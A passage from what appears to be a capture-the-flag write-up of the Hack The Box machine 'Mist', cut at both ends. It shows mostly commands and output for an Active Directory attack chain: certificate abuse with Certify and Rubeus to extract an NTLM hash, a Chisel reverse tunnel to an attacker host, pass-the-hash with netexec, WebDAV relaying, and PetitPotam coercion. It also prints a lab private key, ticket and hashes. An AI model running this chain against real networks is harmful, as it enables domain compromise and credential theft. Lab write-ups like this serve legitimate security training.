class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\xampp\htdocs\files&gt; ./Certify.exe request /ca:DC01\mist<span class="literal">-DC01-CA</span> /template:User</span><br><span class="line">./Certify.exe request /ca:DC01\mist<span class="literal">-DC01-CA</span> /template:User</span><br><span class="line"></span><br><span class="line">   _____          _   _  __              </span><br><span class="line">  / ____|        | | (_)/ _|             </span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _        </span><br><span class="line"> | |    / _ \ <span class="string">&#x27;__| __| |  _| | | |      </span></span><br><span class="line"><span class="string"> | |___|  __/ |  | |_| | | | |_| |       </span></span><br><span class="line"><span class="string">  \_____\___|_|   \__|_|_|  \__, |   </span></span><br><span class="line"><span class="string">                             __/ |       </span></span><br><span class="line"><span class="string">                            |___./        </span></span><br><span class="line"><span class="string">  v1.0.0                               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Action: Request a Certificates</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Current user context    : MIST\Brandon.Keywarp</span></span><br><span class="line"><span class="string">[*] No subject name specified, using current context as subject.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Template                : User</span></span><br><span class="line"><span class="string">[*] Subject                 : CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Certificate Authority   : DC01\mist-DC01-CA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] CA Response             : The certificate had been issued.</span></span><br><span class="line"><span class="string">[*] Request ID              : 60</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] cert.pem         :</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIIEogIBAAKCAQEAu5NKRkDBB/QmHAB2GN/YikaHMyHNbIXnB/kmKHjRkjSgDWV9</span></span><br><span class="line"><span class="string">wI/YcKJwOz+9r7YslUBSVQ4vKdqxZQJOAEEhWmS7m6m7IkFsDHGDViZBJCF77hwd</span></span><br><span class="line"><span class="string">38j96Gf0BT++1ZC6zAybbG+sY9YRMSVpb69/miqL0H2emI9l5Su4Z3fMApQNw7wu</span></span><br><span class="line"><span class="string">wlYJI4qgfjHxPOqYcBgHuhlAGl/DywIlvJvDTnfLdHta+UMDlX0OLFfTuXC4bg2S</span></span><br><span class="line"><span class="string">UR0jGpS1ZT9ItsKXW9rRL6Bbi8vYAxuK1kzWYoaGMFPUWjLVGKIhVskdzmdUkGQx</span></span><br><span class="line"><span class="string">0EOtr4GV6HVpOHueXhq3DoQ0CAmXxi9Xjp6aAQIDAQABAoIBABInjE3GYKhrafDV</span></span><br><span class="line"><span class="string">3phDugqQDu/U+rPhNd4gsB/EqcvzyfXh98zWX0Vvg1tIrQw/nosHgbB3wfrUDs1O</span></span><br><span class="line"><span class="string">7su5ggfkrf+/6rvDBzkhF2wUIcPkdcEy+XU6V9DRlt2XMNosutea9MQG/vFeu6U9</span></span><br><span class="line"><span class="string">ELpdiwUZzxRrxBjR8DPBCoUBJD6veUXAMOBo/habapQMG4uYr9fyrI3dXfKn3rDH</span></span><br><span class="line"><span class="string">3wcuZKxe/W6pCXplQN+4Lub5b3B96Zja8NOk5NDi8ZNnMi7CgHmOwhLO8pvgGCIJ</span></span><br><span class="line"><span class="string">bLYa4Oerib3zPTuA4H8Y7p2HBlJ8XASe6P+hWSSIWPMsMUTzDJ5Pt91LL5pLuMJ5</span></span><br><span class="line"><span class="string">vmaUzN0CgYEA2I/1Veqr5yUFKpWHSoWyb0dw/W4b/YkyOTuyRwMpgC/ar4wjjjsB</span></span><br><span class="line"><span class="string">bBXtREQUn2Vg92pM+6tJHl56Ru6EPWG/usQvjhOdu4rFTeruYiw1AYjQNzEbNnqZ</span></span><br><span class="line"><span class="string">nPz1C/NAAhIkd+vkej6at1NVrixED3M5843YVlWaLXRvr5X25lXEY1cCgYEA3bv4</span></span><br><span class="line"><span class="string">oBKikMG4OayA2vPpHoTFsXGl2VlePbrBpqm6wO30LBsYobPatGWRYMO5PTXbxHRf</span></span><br><span class="line"><span class="string">ssE0A9sRkvmgJCeo7m3OjRsUxRn6y2QHmCf9o0RS7U6wjr/AIC0NwYsu3uSiK6rM</span></span><br><span class="line"><span class="string">QQLvW79vm+D0WYXMcMMWqVQYHtAq6o/FdpOnLmcCgYBEyc1jAgyiejbe5Oo5eKhK</span></span><br><span class="line"><span class="string">AoZYaa5IZVjnpxekyNNY3Vp4Ymo01ndILtrT0VA/pUMcs85KLokmNVpfx4mHudHd</span></span><br><span class="line"><span class="string">8E0usvpqRNURP+uCkYowt5VzwoxjTKQYopzvs8+EGOEummZTkikwzC6uCW+A/NfO</span></span><br><span class="line"><span class="string">jiLGoaA8ifyj6F2polqkNwKBgCXi/mJrjLdrQk0oeoPu9UAvs4/UOWBf8shdZsVR</span></span><br><span class="line"><span class="string">bwWUIwp+PsEyeAYm7KY6Cya4UyrIL6nddUPLZL9WQ9SpqiXDQW2+2Neszrt+BgYr</span></span><br><span class="line"><span class="string">nx0MiZbewTBC91MIH7eYTpPrQQJxFqFtHPTySuG5mEbLo9kInJCmO9DYBN07X6QZ</span></span><br><span class="line"><span class="string">KpG1AoGASrWID2m2B92dTSUCs8GvvLJnwOPfhtdGkxNyKrpk/trlRxg6sQDOmO06</span></span><br><span class="line"><span class="string">lbBFHWwNJ2xu5zibVdwGn9b6h506cVlMsb2V3rmL4H/5jRnscvpXnlKpYO5tnF/1</span></span><br><span class="line"><span class="string">MyUgdBa+GA2xXgu5XGYC2R1cmKT2GqUjb/ijBoNw61Os4ZIbXkQ=</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE-----</span></span><br><span class="line"><span class="string">MIIGDzCCBPegAwIBAgITIwAAADzwnV5kVFJvhwAAAAAAPDANBgkqhkiG9w0BAQsF</span></span><br><span class="line"><span class="string">ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEbWlzdDEV</span></span><br><span class="line"><span class="string">MBMGA1UEAxMMbWlzdC1EQzAxLUNBMB4XDTI0MTAyNTE4MzkzNVoXDTI1MTAyNTE4</span></span><br><span class="line"><span class="string">MzkzNVowVTETMBEGCgmSJomT8ixkARkWA2h0YjEUMBIGCgmSJomT8ixkARkWBG1p</span></span><br><span class="line"><span class="string">c3QxDjAMBgNVBAMTBVVzZXJzMRgwFgYDVQQDEw9CcmFuZG9uLktleXdhcnAwggEi</span></span><br><span class="line"><span class="string">MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7k0pGQMEH9CYcAHYY39iKRocz</span></span><br><span class="line"><span class="string">Ic1shecH+SYoeNGSNKANZX3Aj9hwonA7P72vtiyVQFJVDi8p2rFlAk4AQSFaZLub</span></span><br><span class="line"><span class="string">qbsiQWwMcYNWJkEkIXvuHB3fyP3oZ/QFP77VkLrMDJtsb6xj1hExJWlvr3+aKovQ</span></span><br><span class="line"><span class="string">fZ6Yj2XlK7hnd8wClA3DvC7CVgkjiqB+MfE86phwGAe6GUAaX8PLAiW8m8NOd8t0</span></span><br><span class="line"><span class="string">e1r5QwOVfQ4sV9O5cLhuDZJRHSMalLVlP0i2wpdb2tEvoFuLy9gDG4rWTNZihoYw</span></span><br><span class="line"><span class="string">U9RaMtUYoiFWyR3OZ1SQZDHQQ62vgZXodWk4e55eGrcOhDQICZfGL1eOnpoBAgMB</span></span><br><span class="line"><span class="string">AAGjggLpMIIC5TAXBgkrBgEEAYI3FAIECh4IAFUAcwBlAHIwKQYDVR0lBCIwIAYK</span></span><br><span class="line"><span class="string">KwYBBAGCNwoDBAYIKwYBBQUHAwQGCCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIFoDBE</span></span><br><span class="line"><span class="string">BgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAw</span></span><br><span class="line"><span class="string">BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFLNUagA8YxYJbcgCJIN2xKbg</span></span><br><span class="line"><span class="string">XxyHMB8GA1UdIwQYMBaAFAJHtA9/ZUDlwTbDIo9S3fMCAFUcMIHEBgNVHR8Egbww</span></span><br><span class="line"><span class="string">gbkwgbaggbOggbCGga1sZGFwOi8vL0NOPW1pc3QtREMwMS1DQSxDTj1EQzAxLENO</span></span><br><span class="line"><span class="string">PUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D</span></span><br><span class="line"><span class="string">b25maWd1cmF0aW9uLERDPW1pc3QsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlv</span></span><br><span class="line"><span class="string">bkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBuwYI</span></span><br><span class="line"><span class="string">KwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1taXN0LURD</span></span><br><span class="line"><span class="string">MDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp</span></span><br><span class="line"><span class="string">Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bWlzdCxEQz1odGI/Y0FDZXJ0aWZpY2F0</span></span><br><span class="line"><span class="string">ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwMwYDVR0R</span></span><br><span class="line"><span class="string">BCwwKqAoBgorBgEEAYI3FAIDoBoMGEJyYW5kb24uS2V5d2FycEBtaXN0Lmh0YjBP</span></span><br><span class="line"><span class="string">BgkrBgEEAYI3GQIEQjBAoD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMTA0NTgw</span></span><br><span class="line"><span class="string">OTUwOS0zMDA2NjU4NTg5LTI0MjYwNTU5NDEtMTExMDANBgkqhkiG9w0BAQsFAAOC</span></span><br><span class="line"><span class="string">AQEAAmOuNzVburuCradlPkMvt/CuNObokT6HGTBkr3j+cQL+ymkXKRI/hCncNiRB</span></span><br><span class="line"><span class="string">iO4GOG+JUw+fmXiF9MXnyUeFr6LWhoUWyIxXLCsORojEu0caybUP2afcK78TOypM</span></span><br><span class="line"><span class="string">Glb8XlGHzhQ1uZLIQqHFBjJEcijCYyJzaTZHPVbhKvIEN/C0ydcIwzTYZOgAPJyV</span></span><br><span class="line"><span class="string">ZmFOfJLuOKaqZwkT+k/FsUHkYCryIGglyaqbLQDg9EHqNM739JMHMo1HZZff8fRV</span></span><br><span class="line"><span class="string">3GXAcjCWEaTUYzVr/GDi9NjDB4NDCSidVavIALAkbnOR5J88FrOEHBe5g/WRqVM4</span></span><br><span class="line"><span class="string">x0boNoF5nOGvSbQXhm2bstFJ+Q==</span></span><br><span class="line"><span class="string">-----END CERTIFICATE-----</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Certify completed in 00:00:14.2221415</span></span><br></pre></td></tr></table></figure></div>


<p>I’ll now run the command <code>openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</code> on my machine since openssl is not installed on the victim machine and I’ll be getting a cert.pfx file.</p>
<p>Then, I’ll be requesting a TGT for the user brandon.keywarp using the provided certificate file:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\xampp\htdocs\files&gt; .\Rubeus.exe asktgt /user:brandon.keywarp /certificate:C:\xampp\htdocs\files\cert.pfx /getcredentials /show /nowrap</span><br><span class="line">.\Rubeus.exe asktgt /user:brandon.keywarp /certificate:C:\xampp\htdocs\files\cert.pfx /getcredentials /show /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">2.1</span> </span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> PKINIT with e<span class="keyword">type</span> rc4_hmac and subject: CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb </span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ PKINIT preauth) <span class="keyword">for</span>: <span class="string">&#x27;mist.htb\brandon.keywarp&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: 192.168.100.100:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIGGDCCBhSgAwIBBaEDAgEWooIFMjCCBS5hggUqMIIFJqADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBPIwggTuoAMCARKhAwIBAqKCBOAEggTcSB6ftLMMeu8KI8JB/VQVDG91f+oiRNGeRjV5g82WO7l7YJeuOkqr4SPEzxBIqJOLcsbryTV3J0G1HPgsJA9LsO1q2dCdWVraeoFjnDgE6w7S8PE4/oeKzZjhilb9Ams+P/nvl2FPBWKvtjsqMPu6a+uQwgGikK6RPv1+<span class="number">9</span>vEpL8XqF2a7IocoWlmp6j2UyWBysG0O8KwXReWVfHk1/hqwBJUWtgCTc2zUUXd2qkKpD1v9q7fvWxGe0M3aYwTum3BbslzQ64bF/AIDaKAZPKXOXop+RkLEXN2KFUIT1Y7BTfGn2r1Z1800chhGlUBIup2eh60HPKUbH9RCg6TkbF+//z5p6XhX3SPrcUITL4CIaodkSlH7RvNYJN4ML2ABVqY8Gb7lW9glF/JKMTQ3w8tTsxXBEwoddfXDkci6iifE2S0Y6LRUOa3PUC8ULqwtBN9thMpodGKAa+<span class="number">06</span>lhhN+R8Fwg8EVY4fd5gbIPneDMO3ojNzEhUjYKQHk2Qy/<span class="number">6</span>POp1OBFuilT5dTmkZknuTnpFx/SxhWdbj3Y/<span class="number">7</span>RtEcHMNO6i7BNH74dyCCumA00eFtmyQMZZifN+AjuUV0fcnCYlz7cZOBDOeZpQ7fAR1RI7/qKysibatcdnewzMFaoKuEidOloBo/nAfEt2yG+JzLFIfyNsuNXFUtlWVIFD/luens9Grd3Ebl5jJ9vItHYKIlrZCj7LNekhyu1xp0iiiR/gQmqRMRywHZeITPqgKWschkXhIidf05kLu8F3O2lM+<span class="number">5</span>EZRdyOMrGnzYAb3UU2jdEFIUgzSKo1kt3mCp9X5oXIWzKDEpEdLJl24KV1EPWGVDNjIx8Hdw4YFvXnKgoAGKodRhapTSMJ3XhJvkU9dKMWMr1bQYqjgk5ElVqHvFre9gd3SU43COwCW7Palht7IirOPn2m5AyaouS+IZbEvHPX2/<span class="number">9</span>zZhth8nFKMXbPyPwjl/oakxzlFn/A7Kleo1spqh3WoRhTQgWPBE+GnGWIlUVJlIi0JW251+JU/<span class="number">0</span>aWMqNnNXUMDBQqGcx43eqSuGdFbRlzTHWvVoxo40bGcl65FH+bmYU/IZuCdLRwuKchwWX/Psmw2vLY7npKrBsb/d8W/ScrXjOo2+EsG6CmMPOutiDigpS9b4l4iq1DQCYm8ewKlRQLjhTLofForIRHXWcrn7S7IhuAI538sTssZdn3DGxZdR4faEfer2hwLBaC+qeY4728LW9EGROfIzAoD6HsvqfpHKrSo6zl7WFY3i72ibeRhgQZtcRNfijlQjL7dgUijfCzmOV0Kms8SEEfAn5RaF+J/cyeo5Qc5jnlBrXvlGa+EP9ti7HQfgyRYCg3/<span class="number">8</span>d5wWHwgeGs+SWutYEU7k5MEU8CSiJXHx1twl+AHhX4B9x8EzwbngyaI/pQtFJNcZsKTBm0o7ypefm6XLm2V6/KFlOP3v1/tQG79ULNNAVVj6own0iKLymzT2f0xSF7BsWCEtOgoXzYIEW8ABO4LjMnXMr9d0N4e/<span class="number">6</span>Iu8MUsznAca//<span class="number">9</span>xIbWVjNdYtO25sOWXZYm75VWnYw3Ez09LeLVuGQ1DPJrGru5hmbiymXQbzfZKd9Jfv683NSNF9pX/sQ5bU1Epr3wI7NQnSOXM7ZCc4Cj9fIG3efoTAEQjfvSu9CJf9YWqkl8khGKQR6WRG6Ha4F66jgdEwgc6gAwIBAKKBxgSBw32BwDCBvaCBujCBtzCBtKAbMBmgAwIBF6ESBBCsRdi5skoaK+<span class="number">86</span>gmKDyT7DoQobCE1JU1QuSFRCohwwGqADAgEBoRMwERsPYnJhbmRvbi5rZXl3YXJwowcDBQBA4QAApREYDzIwMjQxMDI1MTkwMTI1WqYRGA8yMDI0MTAyNjA1MDEyNVqnERgPMjAyNDExMDExOTAxMjVaqAobCE1JU1QuSFRCqR0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0Yg==</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/mist.htb</span><br><span class="line">  ServiceRealm             :  MIST.HTB</span><br><span class="line">  UserName                 :  brandon.keywarp</span><br><span class="line">  UserRealm                :  MIST.HTB</span><br><span class="line">  StartTime                :  <span class="number">10</span>/<span class="number">25</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">01</span>:<span class="number">25</span> PM</span><br><span class="line">  EndTime                  :  <span class="number">10</span>/<span class="number">25</span>/<span class="number">2024</span> <span class="number">10</span>:<span class="number">01</span>:<span class="number">25</span> PM</span><br><span class="line">  RenewTill                :  <span class="number">11</span>/<span class="number">1</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">01</span>:<span class="number">25</span> PM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  rc4_hmac</span><br><span class="line">  Base64(key)              :  rEXYubJKGivvOoJig8k+ww==</span><br><span class="line">  ASREP (key)              :  <span class="number">0</span>CD698486D989A6F6EA87ADBC7C1CBE1</span><br><span class="line"></span><br><span class="line">[*] Getting credentials <span class="keyword">using</span> U2U</span><br><span class="line"></span><br><span class="line">  CredentialInfo         :</span><br><span class="line">    Version              : <span class="number">0</span></span><br><span class="line">    EncryptionType       : rc4_hmac</span><br><span class="line">    CredentialData       :</span><br><span class="line">      CredentialCount    : <span class="number">1</span></span><br><span class="line">       NTLM              : DB03D6A77A2205BC1D07082740626CC9</span><br><span class="line"><span class="built_in">PS</span> C:\xampp\htdocs\files&gt; </span><br></pre></td></tr></table></figure></div>


<p>And we got the NTLM hash for brandon.keywrap: <code>DB03D6A77A2205BC1D07082740626CC9</code></p>
<p>I will first be setting up port forwarding for the whole machine using <a class="link"   target="_blank" rel="noopener" href="https://github.com/jpillora/chisel" >Chisel <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>On victim machine:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\xampp\htdocs\files&gt; ./chisel.exe client <span class="number">10.10</span>.x.x:<span class="number">9999</span> <span class="built_in">R</span>:socks</span><br><span class="line">./chisel.exe client <span class="number">10.10</span>.x.x:<span class="number">9999</span> <span class="built_in">R</span>:socks</span><br><span class="line"><span class="number">2024</span>/<span class="number">10</span>/<span class="number">25</span> <span class="number">12</span>:<span class="number">23</span>:<span class="number">20</span> client: Connecting to ws://<span class="number">10.10</span>.x.x:<span class="number">9999</span></span><br><span class="line"><span class="number">2024</span>/<span class="number">10</span>/<span class="number">25</span> <span class="number">12</span>:<span class="number">23</span>:<span class="number">32</span> client: Connected (Latency <span class="number">2.1099799</span>s)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>On attacker machine:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ ./chisel server -p 9999 --reverse </span><br><span class="line">2024/10/25 15:18:44 server: Reverse tunnelling enabled</span><br><span class="line">2024/10/25 15:18:44 server: Fingerprint Cd5gHzHpCEJBsOFWEi3raG5mce9qn7LGOaov5WcKk/A=</span><br><span class="line">2024/10/25 15:18:44 server: Listening on http://0.0.0.0:9999</span><br><span class="line">2024/10/25 15:18:57 server: session<span class="comment">#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>We test out brandon’s credentials:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ proxychains netexec smb 192.168.100.100 -u <span class="string">&#x27;brandon.keywarp&#x27;</span> -H <span class="string">&quot;DB03D6A77A2205BC1D07082740626CC9&quot;</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:135  ...  OK</span><br><span class="line">SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK</span><br><span class="line">SMB         192.168.100.100 445    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h4><p>Now that we confirm that we have a domain user, we can force access, <a class="link"   target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient" >this <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> was a really helpful article and it was actually the piece I was missing when I first solved the machine. So first, I’ll have to enable WebDav client:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\DavRelayUp.exe relay <span class="literal">-l</span> http://*:<span class="number">5357</span>/ <span class="literal">--ComputerName</span> ms01<span class="variable">$</span> <span class="operator">-f</span> <span class="literal">-m</span> shadowcred <span class="literal">--domain</span> mist.htb</span><br></pre></td></tr></table></figure></div>

<p>Then I’ll just run the PetitPotam script while listening with Responder to see if I can capture something:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ proxychains python3 PetitPotam.py -u <span class="string">&#x27;brandon.keywarp&#x27;</span> -hashes <span class="string">&#x27;:DB03D6A77A2205BC1D07082740626CC9&#x27;</span> -pipe all -d mist.htb 10.10.x.x  192.168.100.101 </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line"></span><br><span class="line">                                                                                               </span><br><span class="line">              ___            _        _      _        ___            _                     </span><br><span class="line">             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   </span><br><span class="line">             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | <span class="string">&#x27;  \  </span></span><br><span class="line"><span class="string">            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| </span></span><br><span class="line"><span class="string">          _| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;| </span></span><br><span class="line"><span class="string">          &quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span> </span><br><span class="line">                                         </span><br><span class="line">              PoC to elicit machine account authentication via some MS-EFSRPC <span class="built_in">functions</span></span><br><span class="line">                                      by topotam (@topotam77)</span><br><span class="line">      </span><br><span class="line">                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Trying pipe efsr</span><br><span class="line">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\efsrpc]</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span><br><span class="line">Something went wrong, check error status =&gt; SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.</span><br><span class="line">Trying pipe lsarpc</span><br><span class="line">[-] Connecting to 